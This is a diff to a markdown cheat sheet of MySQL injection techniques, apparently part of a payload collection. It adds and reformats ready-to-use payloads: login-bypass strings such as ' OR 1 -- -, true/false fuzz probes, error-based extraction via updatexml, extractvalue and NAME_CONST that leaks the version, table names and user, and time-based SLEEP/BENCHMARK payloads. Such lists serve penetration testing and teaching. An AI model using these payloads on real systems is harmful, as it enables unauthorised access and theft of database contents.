@@ -2,7 +2,8 @@
 
 ## Summary
 
-* [MYSQL Comment](#mysql-comment)
+* [MYSQL Default Databases](#mysql-default-databases)
+* [MYSQL Comments](#mysql-comments)
 * [MYSQL Union Based](#mysql-union-based)
     * [Detect columns number](#detect-columns-number)
     * [Extract database with information_schema](#extract-database-with-information_schema)
@@ -35,15 +36,61 @@
 * [References](#references)
 
 
-## MYSQL comment
+## MYSQL Default Databases
 
-```sql
-# MYSQL Comment
--- comment [Note the space after the double dash]
-/* MYSQL Comment */
-/*! MYSQL Special SQL */
-/*!32302 10*/ Comment for MYSQL version 3.23.02
-```
+| Name               | Description              |
+|--------------------|--------------------------|
+| mysql              | Requires root privileges |
+| information_schema | Availalble from version 5 and higher |
+	
+
+## MYSQL comments
+
+| Type                       | Description                       |
+|----------------------------|-----------------------------------|
+| `#`                        | Hash comment                      |
+| `/* MYSQL Comment */`      | C-style comment                   |
+| `/*! MYSQL Special SQL */` | Special SQL                       |
+| `/*!32302 10*/`            | Comment for MYSQL version 3.23.02 |
+| `-- -`                     | SQL comment                       |
+| `;%00`                     | Nullbyte                          |
+| \`                         | Backtick                          |
+
+
+## MYSQL Testing Injection
+
+* **Strings**: Query like `SELECT * FROM Table WHERE id = 'FUZZ';`
+    ```
+    '	False
+    ''	True
+    "	False
+    ""	True
+    \	False
+    \\	True
+    ```
+
+* **Numeric**: Query like `SELECT * FROM Table WHERE id = FUZZ;`
+    ```ps1
+    AND 1	    True
+    AND 0	    False
+    AND true	True
+    AND false	False
+    1-false	    Returns 1 if vulnerable
+    1-true	    Returns 0 if vulnerable
+    1*56	    Returns 56 if vulnerable
+    1*56	    Returns 1 if not vulnerable
+    ```
+
+* **Login**: Query like `SELECT * FROM Users WHERE username = 'FUZZ1' AND password = 'FUZZ2';`
+    ```ps1
+    ' OR '1
+    ' OR 1 -- -
+    " OR "" = "
+    " OR 1 = 1 -- -
+    '='
+    'LIKE'
+    '=0--+
+    ```
 
 
 ## MYSQL Union Based
@@ -177,9 +224,6 @@ MariaDB [dummydb]> select author_id,title from posts where author_id=-1 union se
 ```
 
 
-
-
-
 ## MYSQL Error Based
 
 ### MYSQL Error Based - Basic
@@ -190,6 +234,7 @@ Works with `MySQL >= 4.1`
 (select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
 '+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
 ```
+
 
 ### MYSQL Error Based - UpdateXML function
 
@@ -208,6 +253,7 @@ Shorter to read:
 ' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
 ```
 
+
 ### MYSQL Error Based - Extractvalue function
 
 Works with `MySQL >= 5.1`
@@ -220,6 +266,7 @@ Works with `MySQL >= 5.1`
 ?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
 ```
 
+
 ### MYSQL Error Based - NAME_CONST function (only for constants)
 
 Works with `MySQL >= 5.0`
@@ -229,6 +276,7 @@ Works with `MySQL >= 5.0`
 ?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
 ?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
 ```
+
 
 ## MYSQL Blind
 
@@ -306,13 +354,17 @@ SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
 
 The following SQL codes will delay the output from MySQL.
 
-```sql
-+BENCHMARK(40000000,SHA1(1337))+
-'%2Bbenchmark(3200,SHA1(1))%2B'
-AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1
-RLIKE SLEEP([SLEEPTIME])
-OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
-```
+* MySQL 4/5 : `BENCHMARK()`
+    ```sql
+    +BENCHMARK(40000000,SHA1(1337))+
+    '%2Bbenchmark(3200,SHA1(1))%2B'
+    AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1
+    ```
+* MySQL 5: `SLEEP()`
+    ```sql
+    RLIKE SLEEP([SLEEPTIME])
+    OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
+    ```
 
 ### Using SLEEP in a subselect
 
@@ -341,6 +393,7 @@ OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
 ?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3)) --
 ?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
 ```
+
 
 ## MYSQL DIOS - Dump in One Shot
 
